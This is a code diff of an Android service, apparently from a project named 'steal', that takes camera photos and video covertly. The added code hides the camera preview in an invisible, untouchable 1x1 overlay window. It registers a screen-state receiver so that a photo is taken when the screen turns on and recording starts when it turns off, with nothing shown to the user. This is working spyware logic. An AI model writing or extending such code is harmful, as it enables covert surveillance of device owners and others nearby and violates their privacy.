@@ -2,8 +2,10 @@ package com.xiaoxin.jhang.steal.service;
 
 import android.app.Activity;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.hardware.Camera;
 import android.media.AudioManager;
 import android.media.CamcorderProfile;
@@ -12,13 +14,13 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.util.Log;
+import android.view.KeyEvent;
 import android.view.Surface;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.WindowManager;
 import android.view.WindowManager.LayoutParams;
 
-import com.xiaoxin.jhang.steal.CameraVideoActivity;
 import com.xiaoxin.jhang.steal.util.BitmapUtil;
 import com.xiaoxin.jhang.steal.util.FileUtil;
 
@@ -48,7 +50,6 @@ public class CameraService extends Service {
     private boolean mPicVideo;
     public WindowManager mWindowManager;
 
-
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
@@ -60,14 +61,14 @@ public class CameraService extends Service {
     public void onCreate() {
         // TODO Auto-generated method stub
         super.onCreate();
-        mContext = getApplicationContext();
-        mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);
-        mSurfaceView = new SurfaceView(getApplication());
+        mContext = getApplication();
+        mWindowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
+        mSurfaceView = new SurfaceView(this);
         LayoutParams params = new LayoutParams();
         params.width = 1;
         params.height = 1;
         params.alpha = 0;
-        params.type = LayoutParams.FIRST_APPLICATION_WINDOW ;
+        params.type = LayoutParams.TYPE_APPLICATION_OVERLAY ;
         // 屏蔽点击事件
         params.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL | LayoutParams.FLAG_NOT_FOCUSABLE | LayoutParams.FLAG_NOT_TOUCHABLE;
         mWindowManager.addView(mSurfaceView, params);
@@ -95,16 +96,47 @@ public class CameraService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-
         mPicVideo = intent.getBooleanExtra("pic_video",false);
         mTime = intent.getIntExtra("time",10);
 
-        if (mPicVideo) {  //拍照
+        innerReceiver = new InnerReceiver();
+        IntentFilter filter1 = new IntentFilter();
+        //屏幕锁定和解锁的广播
+        filter1.addAction(Intent.ACTION_SCREEN_ON); // 屏幕灭屏广播
+        filter1.addAction(Intent.ACTION_SCREEN_OFF);  // 屏幕亮屏广播
+        filter1.addAction(Intent.ACTION_USER_PRESENT);   // 屏幕解锁广播
+
+        registerReceiver(innerReceiver, filter1);
+
+//        if (mPicVideo) {  //拍照
+//            new Handler().postDelayed(new Runnable() {
+//                @Override
+//                public void run() {
+//                    Log.e(TAG,"拍照");
+//                    mCamera.takePicture(null, null, mPicture);
+//                }
+//            },2000);//延迟2s做准备
+//        }else {  //录像
+//            new Handler().postDelayed(new Runnable() {
+//                @Override
+//                public void run() {
+//                    Log.e(TAG,"录像");
+//                    startMediaRecorder();
+//                    Timer timer = new Timer();
+//                    timer.schedule(new TimerThread(), mTime * 1000);
+//                }
+//            },2000);
+//        }
+        return super.onStartCommand(intent, flags, startId);
+    }
+
+    private void startCamera(boolean falg){
+        if (falg) {  //拍照
             new Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    mCamera.takePicture(null, null, mPicture);
                     Log.e(TAG,"拍照");
+                    mCamera.takePicture(null, null, mPicture);
                 }
             },2000);//延迟2s做准备
         }else {  //录像
@@ -118,7 +150,6 @@ public class CameraService extends Service {
                 }
             },2000);
         }
-        return super.onStartCommand(intent, flags, startId);
     }
 
     /**
@@ -278,5 +309,26 @@ public class CameraService extends Service {
 //            finish();
         }
     }
+
+    private InnerReceiver innerReceiver;
+    private class InnerReceiver extends BroadcastReceiver {
+
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            Log.e(TAG, "onReceive: 广播开启");
+            String action = intent.getAction();
+            if (Intent.ACTION_SCREEN_ON.equals(action)) {
+                Log.i(TAG, "--屏幕亮屏，开启心跳检测");
+                startCamera(true);
+            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
+                Log.i(TAG, "--屏幕灭屏，关闭心跳检测");
+                startCamera(false);
+            }else if (Intent.ACTION_USER_PRESENT.equals(action)) {
+                Log.i(TAG, "--屏幕解锁");
+            }
+        }
+    }
+
+
 
 }
